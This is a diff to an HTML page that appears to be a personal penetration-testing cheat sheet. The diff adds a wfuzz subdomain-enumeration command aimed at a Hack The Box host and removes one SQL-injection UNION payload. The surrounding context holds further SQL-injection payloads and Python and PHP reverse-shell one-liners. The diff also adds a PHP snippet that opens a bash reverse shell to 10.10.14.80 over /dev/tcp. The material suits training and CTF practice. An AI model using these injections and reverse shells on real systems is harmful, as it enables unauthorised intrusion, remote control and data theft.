@@ -27,6 +27,20 @@
 
         <div class="notion-container">
             <div class="notion-header">
+                <h1 id="Enumeration">Enumeration</h1>
+            </div>
+            <h2> Virtual Host (Subdomain) Enumeration</h2>
+            <p> In some cases it would be necessary to enumrate subdomains so we can use wfuzz. We use --hl 234 (Which is the code) in case there are multiple request with the same code </p>
+            <pre><code class="language-bash"> wfuzz -c --hc 404 -t 200 --hl 234 -w /usr/share/wordlists/dirb/small.txt -u http://thetoppers.htb -H "Host: FUZZ.thetoppers.htb"</code></pre>
+            <p> In case that the server responds equally for real subdomains and for not real subdomains we can use the following script that compare the hash of the requests to identify possible true subdomains </p>
+            
+            <a class="cherry-banner" href="/H4ckV4ult/files/cherry.ctb" download="cherry.ctb">
+                <img src="/H4ckV4ult/images/file_logo.png"> 
+                <h3>SubdomainLister.sh</h3>
+            </a>
+           
+
+            <div class="notion-header">
                 <h1 id="OWASP TOP 10">OWASP TOP 10</h1>
             </div>
                 <!-- SQL injection -->
@@ -41,7 +55,7 @@
 ' --</code></pre>
                 <h3> Microsoft, PostgreSQL, MySQL </h3>            
                 <h4> Show all database tables</h4>
-                <pre><code class="language-sql">'+UNION+SELECT+table_name,null+FROM+information_schema.tables--</code></pre>
+                
                 <h4> Show columns of a specific table </h4>
                 <pre><code class="language-sql">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code></pre>
                 <h4> Show data of a table </h4>
@@ -107,6 +121,8 @@
                 <pre><code class="language-python">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234))</code></pre>
                 <h2>PHP</h2>
                 <pre><code class="language-php">php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'</code></pre>
+                <pre><code class="language-php">&lt;?php exec(&quot;/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.14.80/1234 0&gt;&amp;1'&quot;); ?&gt;
+</code></pre>
 
             </div>    
                 
@@ -139,6 +155,8 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
             file.write(data)
     print('Archivo recibido con éxito y guardado como archivo_recibido.txt.')"</code></pre>
             </div>
+
+            
         </div>
     </div>
 
